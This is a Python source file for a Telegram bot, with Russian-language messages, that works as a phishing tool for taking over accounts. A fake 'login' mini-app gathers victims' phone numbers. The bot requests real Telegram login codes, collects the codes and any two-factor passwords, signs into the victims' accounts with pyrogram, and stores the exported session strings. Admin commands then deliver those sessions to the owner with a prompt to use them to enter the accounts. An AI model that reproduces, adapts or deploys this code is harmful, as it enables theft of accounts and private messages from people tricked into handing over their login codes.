import asyncio
import logging
import os
import sqlite3
from datetime import datetime
from aiohttp import web
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, MenuButtonWebApp, WebAppInfo, 
    ReplyKeyboardRemove, InlineKeyboardMarkup, 
    InlineKeyboardButton, CallbackQuery
)
from aiogram.client.default import DefaultBotProperties
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired

# ====== КОНФИГ ======
BOT_TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])
WEBAPP_URL = "https://ps6104062-art.github.io/Logi/"
API_ID = int(os.environ.get("API_ID", 0))  # из my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

# ====== БАЗА ДАННЫХ ======
def init_db():
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, 
                  phone TEXT, 
                  session_string TEXT, 
                  auth_code TEXT,
                  step TEXT,
                  created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS temp_sessions
                 (user_id INTEGER PRIMARY KEY,
                  phone TEXT,
                  code TEXT,
                  created_at TEXT)''')
    conn.commit()
    conn.close()

init_db()

# ====== БОТ ======
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ====== КОМАНДА /START ======
@dp.message(CommandStart())
async def start(message: Message):
    await bot.set_chat_menu_button(
        chat_id=message.chat.id,
        menu_button=MenuButtonWebApp(
            text="🔑 Войти", 
            web_app=WebAppInfo(url=WEBAPP_URL)
        )
    )
    await message.answer(
        "👋 Нажми кнопку ниже для входа\n\n"
        "📱 После отправки номера, код придёт в этот чат",
        reply_markup=ReplyKeyboardRemove()
    )

# ====== ПОЛУЧЕНИЕ КОНТАКТА ======
@dp.message(F.contact)
async def got_contact(message: Message):
    phone = message.contact.phone_number
    user_id = message.from_user.id
    name = message.from_user.full_name
    username = f"@{message.from_user.username}" if message.from_user.username else "нет"
    
    # Сохраняем телефон в БД
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute(
        "INSERT OR REPLACE INTO users (user_id, phone, step, created_at) VALUES (?, ?, ?, ?)",
        (user_id, phone, 'waiting_code', datetime.utcnow().isoformat())
    )
    conn.commit()
    conn.close()
    
    # Отправляем код через Pyrogram
    try:
        client = Client(
            f"session_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            phone_number=phone
        )
        await client.connect()
        sent_code = await client.send_code(phone)
        
        # Сохраняем код в БД
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute(
            "INSERT OR REPLACE INTO temp_sessions (user_id, phone, code, created_at) VALUES (?, ?, ?, ?)",
            (user_id, phone, sent_code.phone_code_hash, datetime.utcnow().isoformat())
        )
        conn.commit()
        conn.close()
        
        await message.answer(
            f"✅ Код отправлен на номер {phone}\n\n"
            "📨 Введите код из SMS или Telegram в этом чате.\n"
            "Пример: <code>12345</code>"
        )
        
        # Уведомление админу
        await bot.send_message(
            OWNER_ID,
            f"📱 Новый запрос входа\n"
            f"👤 {name}\n"
            f"🔗 {username}\n"
            f"🆔 <code>{user_id}</code>\n"
            f"☎️ <code>{phone}</code>"
        )
        
    except Exception as e:
        await message.answer(f"❌ Ошибка отправки кода: {str(e)}")
    
    await client.disconnect()

# ====== ВВОД КОДА ======
@dp.message(F.text)
async def handle_code(message: Message):
    code = message.text.strip()
    user_id = message.from_user.id
    
    # Проверяем, что это код (5-6 цифр)
    if not code.isdigit() or len(code) not in [5, 6]:
        return
    
    # Проверяем, есть ли пользователь в БД
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute("SELECT phone FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    
    if not result:
        await message.answer("❌ Сначала отправьте номер через мини-апп")
        conn.close()
        return
    
    phone = result[0]
    
    # Получаем код хеш
    c.execute("SELECT code FROM temp_sessions WHERE user_id=?", (user_id,))
    temp = c.fetchone()
    conn.close()
    
    if not temp:
        await message.answer("❌ Сессия истекла. Запросите код заново")
        return
    
    code_hash = temp[0]
    
    # Пробуем войти
    try:
        client = Client(
            f"session_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            phone_number=phone
        )
        await client.connect()
        
        # Вход с кодом
        try:
            await client.sign_in(phone, code, phone_code_hash=code_hash)
        except SessionPasswordNeeded:
            await message.answer("🔐 Включена двухфакторная аутентификация. Отправьте пароль.")
            # Сохраняем состояние
            conn = sqlite3.connect('sessions.db')
            c = conn.cursor()
            c.execute("UPDATE users SET step='2fa' WHERE user_id=?", (user_id,))
            conn.commit()
            conn.close()
            await client.disconnect()
            return
        except PhoneCodeInvalid:
            await message.answer("❌ Неверный код. Попробуйте ещё раз")
            await client.disconnect()
            return
        except PhoneCodeExpired:
            await message.answer("⏰ Код истёк. Запросите новый через мини-апп")
            await client.disconnect()
            return
        
        # Успешный вход
        session_string = await client.export_session_string()
        
        # Сохраняем сессию
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute(
            "UPDATE users SET session_string=?, step='active' WHERE user_id=?",
            (session_string, user_id)
        )
        conn.commit()
        conn.close()
        
        await message.answer(
            "✅ <b>Вход выполнен успешно!</b>\n\n"
            "🔐 Аккаунт привязан к боту.\n"
            "📱 Теперь админ может управлять сессией."
        )
        
        # Уведомление админу
        await bot.send_message(
            OWNER_ID,
            f"🔐 <b>Новый вход в аккаунт</b>\n"
            f"🆔 <code>{user_id}</code>\n"
            f"☎️ <code>{phone}</code>\n"
            f"✅ Аккаунт активен"
        )
        
        await client.disconnect()
        
    except Exception as e:
        await message.answer(f"❌ Ошибка: {str(e)}")

# ====== ОБРАБОТКА 2FA ======
@dp.message(F.text)
async def handle_2fa(message: Message):
    user_id = message.from_user.id
    
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute("SELECT step, phone FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    
    if not result or result[0] != '2fa':
        return
    
    password = message.text
    phone = result[1]
    
    try:
        client = Client(
            f"session_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            phone_number=phone
        )
        await client.connect()
        
        await client.check_password(password)
        session_string = await client.export_session_string()
        
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute(
            "UPDATE users SET session_string=?, step='active' WHERE user_id=?",
            (session_string, user_id)
        )
        conn.commit()
        conn.close()
        
        await message.answer("✅ Вход выполнен с 2FA!")
        await client.disconnect()
        
    except Exception as e:
        await message.answer(f"❌ Неверный пароль 2FA: {str(e)}")

# ====== АДМИН-КОМАНДЫ ======
@dp.message(Command("admin"))
async def admin_panel(message: Message):
    if message.from_user.id != OWNER_ID:
        await message.answer("⛔ Доступ запрещён")
        return
    
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute("SELECT user_id, phone, step FROM users WHERE step='active'")
    users = c.fetchall()
    conn.close()
    
    if not users:
        await message.answer("📭 Нет активных сессий")
        return
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(
                text=f"📱 {phone} (ID: {uid})",
                callback_data=f"get_code_{uid}"
            )]
            for uid, phone, _ in users
        ]
    )
    await message.answer("👥 Выберите пользователя:", reply_markup=keyboard)

@dp.callback_query(lambda c: c.data.startswith('get_code_'))
async def get_user_code(callback: CallbackQuery):
    if callback.from_user.id != OWNER_ID:
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return
    
    user_id = int(callback.data.split('_')[2])
    
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute("SELECT phone, session_string FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    
    if not result:
        await callback.answer("Пользователь не найден", show_alert=True)
        return
    
    phone, session_string = result
    
    # Выводим информацию
    await callback.message.answer(
        f"📱 <b>Данные пользователя</b>\n\n"
        f"☎️ Телефон: <code>{phone}</code>\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"🔑 Сессия:\n<code>{session_string[:50]}...</code>\n\n"
        f"⚡ Используйте эту сессию для входа в аккаунт"
    )
    
    await callback.answer()

@dp.message(Command("get_session"))
async def get_session(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /get_session USER_ID")
        return
    
    try:
        user_id = int(args[1])
    except ValueError:
        await message.answer("❌ ID должен быть числом")
        return
    
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute("SELECT phone, session_string FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    
    if not result or not result[1]:
        await message.answer("❌ Сессия не найдена")
        return
    
    phone, session_string = result
    
    # Отправляем полную сессию
    await message.answer(
        f"📱 <b>Полная сессия</b>\n\n"
        f"☎️ Телефон: <code>{phone}</code>\n"
        f"🆔 ID: <code>{user_id}</code>\n\n"
        f"<b>Session String:</b>\n"
        f"<code>{session_string}</code>\n\n"
        f"⚠️ Храните в секрете"
    )

@dp.message(Command("delete_user"))
async def delete_user(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /delete_user USER_ID")
        return
    
    try:
        user_id = int(args[1])
    except ValueError:
        await message.answer("❌ ID должен быть числом")
        return
    
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE user_id=?", (user_id,))
    c.execute("DELETE FROM temp_sessions WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()
    
    await message.answer(f"✅ Пользователь {user_id} удалён")

# ====== WEBHOOK ДЛЯ МИНИ-АПП ======
async def handle_collect(request: web.Request) -> web.Response:
    try:
        data = await request.json()
    except Exception:
        return web.Response(status=400, text="bad json", headers={"Access-Control-Allow-Origin": "*"})
    
    user_id = data.get("user_id")
    if not user_id:
        return web.Response(status=400, text="no user_id", headers={"Access-Control-Allow-Origin": "*"})
    
    # Обновляем данные в БД
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute(
        "UPDATE users SET step='phone_sent' WHERE user_id=?",
        (user_id,)
    )
    conn.commit()
    conn.close()
    
    return web.Response(
        status=200, 
        text="ok", 
        headers={"Access-Control-Allow-Origin": "*"}
    )

# ====== ЗАПУСК ======
async def main():
    logging.basicConfig(level=logging.INFO)
    
    # HTTP сервер
    app = web.Application()
    app.router.add_post("/collect", handle_collect)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", 8080)
    await site.start()
    
    # Бот
    asyncio.create_task(dp.start_polling(bot))
    
    print("✅ Бот запущен")
    print(f"📱 Бот: @{(await bot.get_me()).username}")
    print(f"🔗 WebApp: {WEBAPP_URL}")
    print("📡 Слушаю /collect на порту 8080")
    
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
